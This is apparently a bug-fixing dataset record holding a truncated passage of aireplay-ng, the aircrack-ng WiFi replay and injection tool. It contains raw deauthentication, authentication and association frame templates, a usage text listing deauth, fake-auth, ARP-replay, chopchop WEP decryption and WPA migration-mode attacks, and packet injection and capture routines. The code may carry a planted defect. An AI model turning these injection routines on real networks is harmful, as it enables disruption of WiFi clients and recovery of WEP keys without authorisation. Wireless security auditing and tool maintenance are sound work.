{"buggy_code": ["/*\n *  802.11 WEP replay & injection attacks\n *\n *  Copyright (C) 2006-2013 Thomas d'Otreppe\n *  Copyright (C) 2004, 2005 Christophe Devine\n *\n *  WEP decryption attack (chopchop) developed by KoreK\n *\n *  This program is free software; you can redistribute it and/or modify\n *  it under the terms of the GNU General Public License as published by\n *  the Free Software Foundation; either version 2 of the License, or\n *  (at your option) any later version.\n *\n *  This program is distributed in the hope that it will be useful,\n *  but WITHOUT ANY WARRANTY; without even the implied warranty of\n *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *  GNU General Public License for more details.\n *\n *  You should have received a copy of the GNU General Public License\n *  along with this program; if not, write to the Free Software\n *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA\n *\n *\n *  In addition, as a special exception, the copyright holders give\n *  permission to link the code of portions of this program with the\n *  OpenSSL library under certain conditions as described in each\n *  individual source file, and distribute linked combinations\n *  including the two.\n *  You must obey the GNU General Public License in all respects\n *  for all of the code used other than OpenSSL. *  If you modify\n *  file(s) with this exception, you may extend this exception to your\n *  version of the file(s), but you are not obligated to do so. *  If you\n *  do not wish to do so, delete this exception statement from your\n *  version. *  If you delete this exception statement from all source\n *  files in the program, then also delete it here.\n */\n\n#if defined(linux)\n    #include <linux/rtc.h>\n#endif\n\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <sys/ioctl.h>\n#include <sys/wait.h>\n#include <sys/time.h>\n\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <dirent.h>\n#include <signal.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <errno.h>\n#include <time.h>\n#include <getopt.h>\n\n#include <fcntl.h>\n#include <ctype.h>\n\n#include <limits.h>\n\n#include <netinet/in_systm.h>\n#include <netinet/ip.h>\n#include <netinet/tcp.h>\n\n#include \"version.h\"\n#include \"pcap.h\"\n#include \"osdep/osdep.h\"\n#include \"crypto.h\"\n#include \"common.h\"\n\n#define RTC_RESOLUTION  8192\n\n#define REQUESTS    30\n#define MAX_APS     20\n\n#define NEW_IV  1\n#define RETRY   2\n#define ABORT   3\n\n#define DEAUTH_REQ      \\\n    \"\\xC0\\x00\\x3A\\x01\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\" \\\n    \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\x00\\x00\\x07\\x00\"\n\n#define AUTH_REQ        \\\n    \"\\xB0\\x00\\x3A\\x01\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\" \\\n    \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xB0\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"\n\n#define ASSOC_REQ       \\\n    \"\\x00\\x00\\x3A\\x01\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"  \\\n    \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xC0\\x00\\x31\\x04\\x64\\x00\"\n\n#define REASSOC_REQ       \\\n    \"\\x20\\x00\\x3A\\x01\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"  \\\n    \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xC0\\x00\\x31\\x04\\x64\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n#define NULL_DATA       \\\n    \"\\x48\\x01\\x3A\\x01\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"  \\\n    \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xE0\\x1B\"\n\n#define RTS             \\\n    \"\\xB4\\x00\\x4E\\x04\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"\n\n#define RATES           \\\n    \"\\x01\\x04\\x02\\x04\\x0B\\x16\\x32\\x08\\x0C\\x12\\x18\\x24\\x30\\x48\\x60\\x6C\"\n\n#define PROBE_REQ       \\\n    \"\\x40\\x00\\x00\\x00\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"  \\\n    \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\x00\\x00\"\n\n#define RATE_NUM 12\n\n#define RATE_1M 1000000\n#define RATE_2M 2000000\n#define RATE_5_5M 5500000\n#define RATE_11M 11000000\n\n#define RATE_6M 6000000\n#define RATE_9M 9000000\n#define RATE_12M 12000000\n#define RATE_18M 18000000\n#define RATE_24M 24000000\n#define RATE_36M 36000000\n#define RATE_48M 48000000\n#define RATE_54M 54000000\n\nint bitrates[RATE_NUM]={RATE_1M, RATE_2M, RATE_5_5M, RATE_6M, RATE_9M, RATE_11M, RATE_12M, RATE_18M, RATE_24M, RATE_36M, RATE_48M, RATE_54M};\n\nextern char * getVersion(char * progname, int maj, int min, int submin, int svnrev, int beta, int rc);\nextern int maccmp(unsigned char *mac1, unsigned char *mac2);\nextern unsigned char * getmac(char * macAddress, int strict, unsigned char * mac);\nextern int check_crc_buf( unsigned char *buf, int len );\nextern const unsigned long int crc_tbl[256];\nextern const unsigned char crc_chop_tbl[256][4];\n\nchar usage[] =\n\n\"\\n\"\n\"  %s - (C) 2006-2013 Thomas d\\'Otreppe\\n\"\n\"  http://www.aircrack-ng.org\\n\"\n\"\\n\"\n\"  usage: aireplay-ng <options> <replay interface>\\n\"\n\"\\n\"\n\"  Filter options:\\n\"\n\"\\n\"\n\"      -b bssid  : MAC address, Access Point\\n\"\n\"      -d dmac   : MAC address, Destination\\n\"\n\"      -s smac   : MAC address, Source\\n\"\n\"      -m len    : minimum packet length\\n\"\n\"      -n len    : maximum packet length\\n\"\n\"      -u type   : frame control, type    field\\n\"\n\"      -v subt   : frame control, subtype field\\n\"\n\"      -t tods   : frame control, To      DS bit\\n\"\n\"      -f fromds : frame control, From    DS bit\\n\"\n\"      -w iswep  : frame control, WEP     bit\\n\"\n\"      -D        : disable AP detection\\n\"\n\"\\n\"\n\"  Replay options:\\n\"\n\"\\n\"\n\"      -x nbpps  : number of packets per second\\n\"\n\"      -p fctrl  : set frame control word (hex)\\n\"\n\"      -a bssid  : set Access Point MAC address\\n\"\n\"      -c dmac   : set Destination  MAC address\\n\"\n\"      -h smac   : set Source       MAC address\\n\"\n\"      -g value  : change ring buffer size (default: 8)\\n\"\n\"      -F        : choose first matching packet\\n\"\n\"\\n\"\n\"      Fakeauth attack options:\\n\"\n\"\\n\"\n\"      -e essid  : set target AP SSID\\n\"\n\"      -o npckts : number of packets per burst (0=auto, default: 1)\\n\"\n\"      -q sec    : seconds between keep-alives\\n\"\n\"      -Q        : send reassociation requests\\n\"\n\"      -y prga   : keystream for shared key auth\\n\"\n\"      -T n      : exit after retry fake auth request n time\\n\"\n\"\\n\"\n\"      Arp Replay attack options:\\n\"\n\"\\n\"\n\"      -j        : inject FromDS packets\\n\"\n\"\\n\"\n\"      Fragmentation attack options:\\n\"\n\"\\n\"\n\"      -k IP     : set destination IP in fragments\\n\"\n\"      -l IP     : set source IP in fragments\\n\"\n\"\\n\"\n\"      Test attack options:\\n\"\n\"\\n\"\n\"      -B        : activates the bitrate test\\n\"\n\"\\n\"\n/*\n\"  WIDS evasion options:\\n\"\n\"      -y value  : Use packets older than n packets\\n\"\n\"      -z        : Ghosting\\n\"\n\"\\n\"\n*/\n\"  Source options:\\n\"\n\"\\n\"\n\"      -i iface  : capture packets from this interface\\n\"\n\"      -r file   : extract packets from this pcap file\\n\"\n\"\\n\"\n\"  Miscellaneous options:\\n\"\n\"\\n\"\n\"      -R                    : disable /dev/rtc usage\\n\"\n\"      --ignore-negative-one : if the interface's channel can't be determined,\\n\"\n\"                              ignore the mismatch, needed for unpatched cfg80211\\n\"\n\"\\n\"\n\"  Attack modes (numbers can still be used):\\n\"\n\"\\n\"\n\"      --deauth      count : deauthenticate 1 or all stations (-0)\\n\"\n\"      --fakeauth    delay : fake authentication with AP (-1)\\n\"\n\"      --interactive       : interactive frame selection (-2)\\n\"\n\"      --arpreplay         : standard ARP-request replay (-3)\\n\"\n\"      --chopchop          : decrypt/chopchop WEP packet (-4)\\n\"\n\"      --fragment          : generates valid keystream   (-5)\\n\"\n\"      --caffe-latte       : query a client for new IVs  (-6)\\n\"\n\"      --cfrag             : fragments against a client  (-7)\\n\"\n\"      --migmode           : attacks WPA migration mode  (-8)\\n\"\n\"      --test              : tests injection and quality (-9)\\n\"\n\"\\n\"\n\"      --help              : Displays this usage screen\\n\"\n\"\\n\";\n\n\nstruct options\n{\n    unsigned char f_bssid[6];\n    unsigned char f_dmac[6];\n    unsigned char f_smac[6];\n    int f_minlen;\n    int f_maxlen;\n    int f_type;\n    int f_subtype;\n    int f_tods;\n    int f_fromds;\n    int f_iswep;\n\n    int r_nbpps;\n    int r_fctrl;\n    unsigned char r_bssid[6];\n    unsigned char r_dmac[6];\n    unsigned char r_smac[6];\n    unsigned char r_dip[4];\n    unsigned char r_sip[4];\n    char r_essid[33];\n    int r_fromdsinj;\n    char r_smac_set;\n\n    char ip_out[16];    //16 for 15 chars + \\x00\n    char ip_in[16];\n    int port_out;\n    int port_in;\n\n    char *iface_out;\n    char *s_face;\n    char *s_file;\n    unsigned char *prga;\n\n    int a_mode;\n    int a_count;\n    int a_delay;\n\tint f_retry;\n\n    int ringbuffer;\n    int ghost;\n    int prgalen;\n\n    int delay;\n    int npackets;\n\n    int fast;\n    int bittest;\n\n    int nodetect;\n    int ignore_negative_one;\n    int rtc;\n\n    int reassoc;\n}\nopt;\n\nstruct devices\n{\n    int fd_in,  arptype_in;\n    int fd_out, arptype_out;\n    int fd_rtc;\n\n    unsigned char mac_in[6];\n    unsigned char mac_out[6];\n\n    int is_wlanng;\n    int is_hostap;\n    int is_madwifi;\n    int is_madwifing;\n    int is_bcm43xx;\n\n    FILE *f_cap_in;\n\n    struct pcap_file_header pfh_in;\n}\ndev;\n\nstatic struct wif *_wi_in, *_wi_out;\n\nstruct ARP_req\n{\n    unsigned char *buf;\n    int hdrlen;\n    int len;\n};\n\nstruct APt\n{\n    unsigned char set;\n    unsigned char found;\n    unsigned char len;\n    unsigned char essid[255];\n    unsigned char bssid[6];\n    unsigned char chan;\n    unsigned int  ping[REQUESTS];\n    int  pwr[REQUESTS];\n};\n\nstruct APt ap[MAX_APS];\n\nunsigned long nb_pkt_sent;\nunsigned char h80211[4096];\nunsigned char tmpbuf[4096];\nunsigned char srcbuf[4096];\nchar strbuf[512];\n\nunsigned char ska_auth1[]     = \"\\xb0\\x00\\x3a\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                        \"\\x00\\x00\\x00\\x00\\x00\\x00\\xb0\\x01\\x01\\x00\\x01\\x00\\x00\\x00\";\n\nunsigned char ska_auth3[4096] = \"\\xb0\\x40\\x3a\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                        \"\\x00\\x00\\x00\\x00\\x00\\x00\\xc0\\x01\";\n\n\nint ctrl_c, alarmed;\n\nchar * iwpriv;\n\n\nvoid sighandler( int signum )\n{\n    if( signum == SIGINT )\n        ctrl_c++;\n\n    if( signum == SIGALRM )\n        alarmed++;\n}\n\nint reset_ifaces()\n{\n    //close interfaces\n    if(_wi_in != _wi_out)\n    {\n        if(_wi_in)\n        {\n            wi_close(_wi_in);\n            _wi_in = NULL;\n        }\n        if(_wi_out)\n        {\n            wi_close(_wi_out);\n            _wi_out = NULL;\n        }\n    }\n    else\n    {\n        if(_wi_out)\n        {\n            wi_close(_wi_out);\n            _wi_out = NULL;\n            _wi_in = NULL;\n        }\n    }\n\n    /* open the replay interface */\n    _wi_out = wi_open(opt.iface_out);\n    if (!_wi_out)\n        return 1;\n    dev.fd_out = wi_fd(_wi_out);\n\n    /* open the packet source */\n    if( opt.s_face != NULL )\n    {\n        _wi_in = wi_open(opt.s_face);\n        if (!_wi_in)\n            return 1;\n        dev.fd_in = wi_fd(_wi_in);\n        wi_get_mac(_wi_in, dev.mac_in);\n    }\n    else\n    {\n        _wi_in = _wi_out;\n        dev.fd_in = dev.fd_out;\n\n        /* XXX */\n        dev.arptype_in = dev.arptype_out;\n        wi_get_mac(_wi_in, dev.mac_in);\n    }\n\n    wi_get_mac(_wi_out, dev.mac_out);\n\n    return 0;\n}\n\nint set_bitrate(struct wif *wi, int rate)\n{\n    int i, newrate;\n\n    if( wi_set_rate(wi, rate) )\n        return 1;\n\n//    if( reset_ifaces() )\n//        return 1;\n\n    //Workaround for buggy drivers (rt73) that do not accept 5.5M, but 5M instead\n    if (rate == 5500000 && wi_get_rate(wi) != 5500000) {\n\tif( wi_set_rate(wi, 5000000) )\n\t    return 1;\n    }\n\n    newrate = wi_get_rate(wi);\n    for(i=0; i<RATE_NUM; i++)\n    {\n        if(bitrates[i] == rate)\n            break;\n    }\n    if(i==RATE_NUM)\n        i=-1;\n    if( newrate != rate )\n    {\n        if(i!=-1)\n        {\n            if( i>0 )\n            {\n                if(bitrates[i-1] >= newrate)\n                {\n                    printf(\"Couldn't set rate to %.1fMBit. (%.1fMBit instead)\\n\", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));\n                    return 1;\n                }\n            }\n            if( i<RATE_NUM-1 )\n            {\n                if(bitrates[i+1] <= newrate)\n                {\n                    printf(\"Couldn't set rate to %.1fMBit. (%.1fMBit instead)\\n\", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));\n                    return 1;\n                }\n            }\n            return 0;\n        }\n        printf(\"Couldn't set rate to %.1fMBit. (%.1fMBit instead)\\n\", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));\n        return 1;\n    }\n    return 0;\n}\n\nint send_packet(void *buf, size_t count)\n{\n\tstruct wif *wi = _wi_out; /* XXX globals suck */\n\tunsigned char *pkt = (unsigned char*) buf;\n\n\tif( (count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)\n\t{\n\t\tpkt[22] = (nb_pkt_sent & 0x0000000F) << 4;\n\t\tpkt[23] = (nb_pkt_sent & 0x00000FF0) >> 4;\n\t}\n\n\tif (wi_write(wi, buf, count, NULL) == -1) {\n\t\tswitch (errno) {\n\t\tcase EAGAIN:\n\t\tcase ENOBUFS:\n\t\t\tusleep(10000);\n\t\t\treturn 0; /* XXX not sure I like this... -sorbo */\n\t\t}\n\n\t\tperror(\"wi_write()\");\n\t\treturn -1;\n\t}\n\n\tnb_pkt_sent++;\n\treturn 0;\n}\n\nint read_packet(void *buf, size_t count, struct rx_info *ri)\n{\n\tstruct wif *wi = _wi_in; /* XXX */\n\tint rc;\n\n        rc = wi_read(wi, buf, count, ri);\n        if (rc == -1) {\n            switch (errno) {\n            case EAGAIN:\n                    return 0;\n            }\n\n            perror(\"wi_read()\");\n            return -1;\n        }\n\n\treturn rc;\n}\n\nvoid read_sleep( int usec )\n{\n    struct timeval tv, tv2, tv3;\n    int caplen;\n    fd_set rfds;\n\n    gettimeofday(&tv, NULL);\n    gettimeofday(&tv2, NULL);\n\n    tv3.tv_sec=0;\n    tv3.tv_usec=10000;\n\n    while( ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) < (usec) )\n    {\n        FD_ZERO( &rfds );\n        FD_SET( dev.fd_in, &rfds );\n\n        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv3 ) < 0 )\n        {\n            continue;\n        }\n\n        if( FD_ISSET( dev.fd_in, &rfds ) )\n            caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n        gettimeofday(&tv2, NULL);\n    }\n}\n\n\nint filter_packet( unsigned char *h80211, int caplen )\n{\n    int z, mi_b, mi_s, mi_d, ext=0, qos;\n\n    if(caplen <= 0)\n        return( 1 );\n\n    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n    if ( ( h80211[0] & 0x80 ) == 0x80 )\n    {\n        qos = 1; /* 802.11e QoS */\n        z+=2;\n    }\n\n    if( (h80211[0] & 0x0C) == 0x08)    //if data packet\n        ext = z-24; //how many bytes longer than default ieee80211 header\n\n    /* check length */\n    if( caplen-ext < opt.f_minlen ||\n        caplen-ext > opt.f_maxlen ) return( 1 );\n\n    /* check the frame control bytes */\n\n    if( ( h80211[0] & 0x0C ) != ( opt.f_type    << 2 ) &&\n        opt.f_type    >= 0 ) return( 1 );\n\n    if( ( h80211[0] & 0x70 ) != (( opt.f_subtype << 4 ) & 0x70) && //ignore the leading bit (QoS)\n        opt.f_subtype >= 0 ) return( 1 );\n\n    if( ( h80211[1] & 0x01 ) != ( opt.f_tods         ) &&\n        opt.f_tods    >= 0 ) return( 1 );\n\n    if( ( h80211[1] & 0x02 ) != ( opt.f_fromds  << 1 ) &&\n        opt.f_fromds  >= 0 ) return( 1 );\n\n    if( ( h80211[1] & 0x40 ) != ( opt.f_iswep   << 6 ) &&\n        opt.f_iswep   >= 0 ) return( 1 );\n\n    /* check the extended IV (TKIP) flag */\n\n    if( opt.f_type == 2 && opt.f_iswep == 1 &&\n        ( h80211[z + 3] & 0x20 ) != 0 ) return( 1 );\n\n    /* MAC address checking */\n\n    switch( h80211[1] & 3 )\n    {\n        case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;\n        case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;\n        case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;\n        default: mi_b = 10; mi_d = 16; mi_s = 24; break;\n    }\n\n    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) != 0 )\n        if( memcmp( h80211 + mi_b, opt.f_bssid, 6 ) != 0 )\n            return( 1 );\n\n    if( memcmp( opt.f_smac,  NULL_MAC, 6 ) != 0 )\n        if( memcmp( h80211 + mi_s,  opt.f_smac,  6 ) != 0 )\n            return( 1 );\n\n    if( memcmp( opt.f_dmac,  NULL_MAC, 6 ) != 0 )\n        if( memcmp( h80211 + mi_d,  opt.f_dmac,  6 ) != 0 )\n            return( 1 );\n\n    /* this one looks good */\n\n    return( 0 );\n}\n\nint wait_for_beacon(unsigned char *bssid, unsigned char *capa, char *essid)\n{\n    int len = 0, chan = 0, taglen = 0, tagtype = 0, pos = 0;\n    unsigned char pkt_sniff[4096];\n    struct timeval tv,tv2;\n    char essid2[33];\n\n    gettimeofday(&tv, NULL);\n    while (1)\n    {\n        len = 0;\n        while (len < 22)\n        {\n            len = read_packet(pkt_sniff, sizeof(pkt_sniff), NULL);\n\n            gettimeofday(&tv2, NULL);\n            if(((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 10000*1000) //wait 10sec for beacon frame\n            {\n                return -1;\n            }\n            if(len <= 0) usleep(1);\n        }\n        if (! memcmp(pkt_sniff, \"\\x80\", 1))\n        {\n            pos = 0;\n            taglen = 22;    //initial value to get the fixed tags parsing started\n            taglen+= 12;    //skip fixed tags in frames\n            do\n            {\n                pos    += taglen + 2;\n                tagtype = pkt_sniff[pos];\n                taglen  = pkt_sniff[pos+1];\n            } while(tagtype != 3 && pos < len-2);\n\n            if(tagtype != 3) continue;\n            if(taglen != 1) continue;\n            if(pos+2+taglen > len) continue;\n\n            chan = pkt_sniff[pos+2];\n\n            if(essid)\n            {\n                pos = 0;\n                taglen = 22;    //initial value to get the fixed tags parsing started\n                taglen+= 12;    //skip fixed tags in frames\n                do\n                {\n                    pos    += taglen + 2;\n                    tagtype = pkt_sniff[pos];\n                    taglen  = pkt_sniff[pos+1];\n                } while(tagtype != 0 && pos < len-2);\n\n                if(tagtype != 0) continue;\n                if(taglen <= 1)\n                {\n                    if (memcmp(bssid, pkt_sniff+10, 6) == 0) break;\n                    else continue;\n                }\n                if(pos+2+taglen > len) continue;\n\n                if(taglen > 32)taglen = 32;\n\n                if((pkt_sniff+pos+2)[0] < 32 && memcmp(bssid, pkt_sniff+10, 6) == 0)\n                {\n                    break;\n                }\n\n                /* if bssid is given, copy essid */\n                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) == 0)\n                {\n                    memset(essid, 0, 33);\n                    memcpy(essid, pkt_sniff+pos+2, taglen);\n                    break;\n                }\n\n                /* if essid is given, copy bssid AND essid, so we can handle case insensitive arguments */\n                if(bssid != NULL && memcmp(bssid, NULL_MAC, 6) == 0 && strncasecmp(essid, (char*)pkt_sniff+pos+2, taglen) == 0 && strlen(essid) == (unsigned)taglen)\n                {\n                    memset(essid, 0, 33);\n                    memcpy(essid, pkt_sniff+pos+2, taglen);\n                    memcpy(bssid, pkt_sniff+10, 6);\n                    printf(\"Found BSSID \\\"%02X:%02X:%02X:%02X:%02X:%02X\\\" to given ESSID \\\"%s\\\".\\n\", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], essid);\n                    break;\n                }\n\n                /* if essid and bssid are given, check both */\n                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) > 0)\n                {\n                    memset(essid2, 0, 33);\n                    memcpy(essid2, pkt_sniff+pos+2, taglen);\n                    if(strncasecmp(essid, essid2, taglen) == 0 && strlen(essid) == (unsigned)taglen)\n                        break;\n                    else\n                    {\n                        printf(\"For the given BSSID \\\"%02X:%02X:%02X:%02X:%02X:%02X\\\", there is an ESSID mismatch!\\n\", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);\n                        printf(\"Found ESSID \\\"%s\\\" vs. specified ESSID \\\"%s\\\"\\n\", essid2, essid);\n                        printf(\"Using the given one, double check it to be sure its correct!\\n\");\n                        break;\n                    }\n                }\n            }\n        }\n    }\n\n    if(capa) memcpy(capa, pkt_sniff+34, 2);\n\n    return chan;\n}\n\n/**\n    if bssid != NULL its looking for a beacon frame\n*/\nint attack_check(unsigned char* bssid, char* essid, unsigned char* capa, struct wif *wi)\n{\n    int ap_chan=0, iface_chan=0;\n\n    iface_chan = wi_get_channel(wi);\n\n    if(iface_chan == -1 && !opt.ignore_negative_one)\n    {\n        PCT; printf(\"Couldn't determine current channel for %s, you should either force the operation with --ignore-negative-one or apply a kernel patch\\n\",\n                wi_get_ifname(wi));\n        return -1;\n    }\n\n    if(bssid != NULL)\n    {\n        ap_chan = wait_for_beacon(bssid, capa, essid);\n        if(ap_chan < 0)\n        {\n            PCT; printf(\"No such BSSID available.\\n\");\n            return -1;\n        }\n        if((ap_chan != iface_chan) && (iface_chan != -1 || !opt.ignore_negative_one))\n        {\n            PCT; printf(\"%s is on channel %d, but the AP uses channel %d\\n\", wi_get_ifname(wi), iface_chan, ap_chan);\n            return -1;\n        }\n    }\n\n    return 0;\n}\n\nint getnet( unsigned char* capa, int filter, int force)\n{\n    unsigned char *bssid;\n\n    if(opt.nodetect)\n        return 0;\n\n    if(filter)\n        bssid = opt.f_bssid;\n    else\n        bssid = opt.r_bssid;\n\n\n    if( memcmp(bssid, NULL_MAC, 6) )\n    {\n        PCT; printf(\"Waiting for beacon frame (BSSID: %02X:%02X:%02X:%02X:%02X:%02X) on channel %d\\n\",\n                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],wi_get_channel(_wi_in));\n    }\n    else if(strlen(opt.r_essid) > 0)\n    {\n        PCT; printf(\"Waiting for beacon frame (ESSID: %s) on channel %d\\n\", opt.r_essid,wi_get_channel(_wi_in));\n    }\n    else if(force)\n    {\n        PCT;\n        if(filter)\n        {\n            printf(\"Please specify at least a BSSID (-b) or an ESSID (-e)\\n\");\n        }\n        else\n        {\n            printf(\"Please specify at least a BSSID (-a) or an ESSID (-e)\\n\");\n        }\n        return( 1 );\n    }\n    else\n        return 0;\n\n    if( attack_check(bssid, opt.r_essid, capa, _wi_in) != 0)\n    {\n        if(memcmp(bssid, NULL_MAC, 6))\n        {\n            if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)\n            {\n                printf( \"Please specify an ESSID (-e).\\n\" );\n            }\n        }\n\n        if(!memcmp(bssid, NULL_MAC, 6))\n        {\n            if(strlen(opt.r_essid) > 0)\n            {\n                printf( \"Please specify a BSSID (-a).\\n\" );\n            }\n        }\n        return( 1 );\n    }\n\n    return 0;\n}\n\nint xor_keystream(unsigned char *ph80211, unsigned char *keystream, int len)\n{\n    int i=0;\n\n    for (i=0; i<len; i++) {\n        ph80211[i] = ph80211[i] ^ keystream[i];\n    }\n\n    return 0;\n}\n\nint capture_ask_packet( int *caplen, int just_grab )\n{\n    time_t tr;\n    struct timeval tv;\n    struct tm *lt;\n\n    fd_set rfds;\n    long nb_pkt_read;\n    int i, j, n, mi_b=0, mi_s=0, mi_d=0, mi_t=0, mi_r=0, is_wds=0, key_index_offset;\n    int ret, z;\n\n    FILE *f_cap_out;\n    struct pcap_file_header pfh_out;\n    struct pcap_pkthdr pkh;\n\n    if( opt.f_minlen  < 0 ) opt.f_minlen  =   40;\n    if( opt.f_maxlen  < 0 ) opt.f_maxlen  = 1500;\n    if( opt.f_type    < 0 ) opt.f_type    =    2;\n    if( opt.f_subtype < 0 ) opt.f_subtype =    0;\n    if( opt.f_iswep   < 0 ) opt.f_iswep   =    1;\n\n    tr = time( NULL );\n\n    nb_pkt_read = 0;\n\n    signal( SIGINT, SIG_DFL );\n\n    while( 1 )\n    {\n        if( time( NULL ) - tr > 0 )\n        {\n            tr = time( NULL );\n            printf( \"\\rRead %ld packets...\\r\", nb_pkt_read );\n            fflush( stdout );\n        }\n\n        if( opt.s_file == NULL )\n        {\n            FD_ZERO( &rfds );\n            FD_SET( dev.fd_in, &rfds );\n\n            tv.tv_sec  = 1;\n            tv.tv_usec = 0;\n\n            if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )\n            {\n                if( errno == EINTR ) continue;\n                perror( \"select failed\" );\n                return( 1 );\n            }\n\n            if( ! FD_ISSET( dev.fd_in, &rfds ) )\n                continue;\n\n            gettimeofday( &tv, NULL );\n\n            *caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n            if( *caplen  < 0 ) return( 1 );\n            if( *caplen == 0 ) continue;\n        }\n        else\n        {\n            /* there are no hidden backdoors in this source code */\n\n            n = sizeof( pkh );\n\n            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )\n            {\n                printf( \"\\r\\33[KEnd of file.\\n\" );\n                return( 1 );\n            }\n\n            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {\n                SWAP32( pkh.caplen );\n                SWAP32( pkh.len );\n            }\n\n            tv.tv_sec  = pkh.tv_sec;\n            tv.tv_usec = pkh.tv_usec;\n\n            n = *caplen = pkh.caplen;\n\n            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )\n            {\n                printf( \"\\r\\33[KInvalid packet length %d.\\n\", n );\n                return( 1 );\n            }\n\n            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )\n            {\n                printf( \"\\r\\33[KEnd of file.\\n\" );\n                return( 1 );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )\n            {\n                /* remove the prism header */\n\n                if( h80211[7] == 0x40 )\n                    n = 64;\n                else\n                    n = *(int *)( h80211 + 4 );\n\n                if( n < 8 || n >= (int) *caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, *caplen );\n                *caplen -= n;\n                memcpy( h80211, tmpbuf + n, *caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )\n            {\n                /* remove the radiotap header */\n\n                n = *(unsigned short *)( h80211 + 2 );\n\n                if( n <= 0 || n >= (int) *caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, *caplen );\n                *caplen -= n;\n                memcpy( h80211, tmpbuf + n, *caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )\n            {\n                /* remove the PPI header */\n\n                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));\n\n                if( n <= 0 || n>= (int) *caplen )\n                    continue;\n\n                /* for a while Kismet logged broken PPI headers */\n                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )\n                    n = 32;\n\n                if( n <= 0 || n>= (int) *caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, *caplen );\n                *caplen -= n;\n                memcpy( h80211, tmpbuf + n, *caplen );\n            }\n        }\n\n        nb_pkt_read++;\n\n        if( filter_packet( h80211, *caplen ) != 0 )\n            continue;\n\n        if(opt.fast)\n            break;\n\n        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n            z+=2;\n\n        switch( h80211[1] & 3 )\n        {\n            case  0: mi_b = 16; mi_s = 10; mi_d =  4; is_wds = 0; break;\n            case  1: mi_b =  4; mi_s = 10; mi_d = 16; is_wds = 0; break;\n            case  2: mi_b = 10; mi_s = 16; mi_d =  4; is_wds = 0; break;\n            case  3: mi_t = 10; mi_r =  4; mi_d = 16; mi_s = 24; is_wds = 1; break;  // WDS packet\n        }\n\n        printf( \"\\n\\n        Size: %d, FromDS: %d, ToDS: %d\",\n                *caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );\n\n        if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )\n        {\n//             if (is_wds) key_index_offset = 33; // WDS packets have an additional MAC, so the key index is at byte 33\n//             else key_index_offset = 27;\n            key_index_offset = z+3;\n\n            if( ( h80211[key_index_offset] & 0x20 ) == 0 )\n                printf( \" (WEP)\" );\n            else\n                